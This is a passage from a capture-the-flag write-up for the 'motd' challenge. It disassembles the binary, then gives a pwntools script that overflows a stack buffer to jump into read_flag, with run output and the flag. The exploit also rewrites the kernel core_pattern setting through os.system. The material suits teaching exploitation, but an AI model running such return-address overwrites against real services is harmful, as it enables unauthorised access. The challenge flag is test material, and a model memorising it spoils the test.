[0x60606060]> pdf @ sym.read_flag
/ (fcn) sym.read_flag 118
|   sym.read_flag ();
|           ; var int local_110h @ rbp-0x110
|           ; var int local_8h @ rbp-0x8
|           ; CALL XREF from sym.get_admin_motd (0x60606202)
|           0x606063a5      55             push rbp
|           0x606063a6      4889e5         mov rbp, rsp
|           0x606063a9      4881ec100100.  sub rsp, 0x110
|           0x606063b0      488d95f0feff.  lea rdx, [local_110h]
|           0x606063b7      b800000000     mov eax, 0
|           0x606063bc      b920000000     mov ecx, 0x20               ; 32
|           0x606063c1      4889d7         mov rdi, rdx
|           0x606063c4      f348ab         rep stosq qword [rdi], rax
|           0x606063c7      488d352a0200.  lea rsi, [0x606065f8]       ; "r"
|           0x606063ce      488d3d250200.  lea rdi, str.._flag.txt     ; 0x606065fa ; "./flag.txt"
|           0x606063d5      e876a4df9f     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
|           0x606063da      488945f8       mov qword [local_8h], rax
|           0x606063de      488d95f0feff.  lea rdx, [local_110h]
|           0x606063e5      488b45f8       mov rax, qword [local_8h]
|           0x606063e9      488d35150200.  lea rsi, [0x60606605]       ; "%s"
|           0x606063f0      4889c7         mov rdi, rax
|           0x606063f3      b800000000     mov eax, 0
|           0x606063f8      e8e3a3df9f     call sym.imp.__isoc99_fscanf ; int fscanf(FILE *stream, const char *format, ...)
|           0x606063fd      488d85f0feff.  lea rax, [local_110h]
|           0x60606404      4889c6         mov rsi, rax
|           0x60606407      488d3dfa0100.  lea rdi, str.Admin_MOTD_is:__s ; 0x60606608 ; "Admin MOTD is: %s\n"
|           0x6060640e      b800000000     mov eax, 0
|           0x60606413      e808a4df9f     call sym.imp.printf         ; int printf(const char *format)
|           0x60606418      90             nop
|           0x60606419      c9             leave
\           0x6060641a      c3             ret
```
The function just reads the flag and outputs it, no authentication checks performed. Looks like the checks are done in the calling function:
```assembly
[0x60606060]> pdf @ sym.get_admin_motd
/ (fcn) sym.get_admin_motd 49
|   sym.get_admin_motd ();
|           ; var int local_4h @ rbp-0x4
|           ; CALL XREF from sym.main (0x60606386)
|           0x606061d9      55             push rbp
|           0x606061da      4889e5         mov rbp, rsp
|           0x606061dd      4883ec10       sub rsp, 0x10
|           0x606061e1      e81aa6df9f     call sym.imp.getuid         ; uid_t getuid(void)
|           0x606061e6      8945fc         mov dword [local_4h], eax
|           0x606061e9      837dfc00       cmp dword [local_4h], 0
|       ,= 0x606061fd      b800000000     mov eax, 0
|      |    0x60606202      e89e010000     call sym.read_flag
|      |    0x60606207      90             nop
|      |    ; CODE XREF from sym.get_admin_motd (0x606061fb)
|      `--> 0x60606208      c9             leave
\           0x60606209      c3             ret
```
So, we can directly jump to `read_flag` and get the flag.
Python script:
```python
from pwn import *
import os
context(arch='amd64', os='linux', bits = '64')
LOCAL_PATH = "./motd"
def read_menu(proc):
    proc.recvuntil("choice: ")
def get_user_motd(proc):
    read_menu(proc)
    proc.sendline("1")
    proc.recvuntil("MOTD: ")
    out = proc.recvline()
    log.info("Get user MOTD: {}".format(out))
    return out
def set_user_motd(proc, motd):
    log.info("Setting user MOTD: {}".format(motd))
    read_menu(proc)
    proc.sendline("2")
    proc.sendlineafter("New msg: ", motd)
def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(LOCAL_PATH)
    set_user_motd(proc, cyclic(300, n = 8))
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = 8)
    log.info("Overflow offset: {}".format(offset))
    return offset
offset = get_overflow_offset()
r = remote("motd.ctfcompetition.com", 1337)
elf = ELF(LOCAL_PATH)
read_flag_address = elf.symbols["read_flag"]
log.info("Address of read_flag: {}".format(hex(read_flag_address)))
set_user_motd(r, fit({offset: read_flag_address}))
print r.recvall()
```
Output:
```console
root@kali:/media/sf_CTFs/google/message/1# python exploit.py
[+] Starting local process './motd': pid 1028
[*] Setting user MOTD: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
[*] Process './motd' stopped with exit code -11 (SIGSEGV) (pid 1028)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/google/message/1/core.1028'
    Arch:      amd64-64-little
    RIP:       0x606061a3
    RSP:       0x7ffd8f98a1e8
    Exe:       '/media/sf_CTFs/google/message/1/motd' (0x60606000)
    Fault:     0x6261616161616169
[*] Overflow offset: 264
[+] Opening connection to motd.ctfcompetition.com on port 1337: Done
[*] '/media/sf_CTFs/google/message/1/motd'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Address of read_flag: 0x606063a5
[*] Setting user MOTD: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaac\xa5c``\x00\x00\x00\x00
[+] Receiving all data: Done (74B)
[*] Closed connection to motd.ctfcompetition.com port 1337
New message of the day saved!
Admin MOTD is: CTF{m07d_1s_r3t_2_r34d_fl4g}
```
The flag: CTF{m07d_1s_r3t_2_r34d_fl4g}